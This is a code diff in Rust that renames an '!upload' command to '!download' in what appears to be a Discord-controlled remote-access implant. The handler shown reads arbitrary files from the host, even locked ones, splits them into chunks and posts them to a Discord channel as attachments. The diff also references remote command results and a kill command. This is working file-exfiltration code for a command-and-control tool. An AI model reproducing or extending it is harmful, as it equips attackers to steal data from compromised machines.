@@ -403,8 +403,8 @@ impl DiscordClient {
                 self.send_command_result(channel_id, result)?;
                 Ok(true)
             }
-            Command::Upload(path) => {
-                self.handle_upload(channel_id, &path)?;
+            Command::Download(path) => {
+                self.handle_download(channel_id, &path)?;
                 Ok(true)
             }
             Command::Kill => {
@@ -470,10 +470,10 @@ impl DiscordClient {
         }
     }
 
-    /// Handle the !upload command
+    /// Handle the !download command
     /// Reads a file from disk (even if locked) and sends it as Discord attachment(s)
     /// Files > 24 MB are split into multiple parts
-    fn handle_upload(&self, channel_id: &str, file_path: &str) -> Result<()> {
+    fn handle_download(&self, channel_id: &str, file_path: &str) -> Result<()> {
         const CHUNK_SIZE: usize = 7 * 1024 * 1024; // 7 MB par chunk (limite Discord sans Nitro = 8 MB)
 
         self.send_message(channel_id, &format!("Reading `{}`...", file_path))?;
@@ -492,7 +492,7 @@ impl DiscordClient {
             match self.send_binary_file(channel_id, &filename, &data, "application/octet-stream") {
                 Ok(_) => {}
                 Err(e) => {
-                    self.send_message(channel_id, &format!("Upload failed: {}", e))?;
+                    self.send_message(channel_id, &format!("Download failed: {}", e))?;
                 }
             }
             return Ok(());
@@ -517,14 +517,14 @@ impl DiscordClient {
                 Err(e) => {
                     self.send_message(
                         channel_id,
-                        &format!("Failed to upload part {}/{}: {}", i + 1, total_chunks, e),
+                        &format!("Failed to download part {}/{}: {}", i + 1, total_chunks, e),
                     )?;
                     return Ok(());
                 }
             }
         }
 
-        self.send_message(channel_id, &format!("Upload complete: {} parts sent", total_chunks))?;
+        self.send_message(channel_id, &format!("Download complete: {} parts sent", total_chunks))?;
         Ok(())
     }
 }
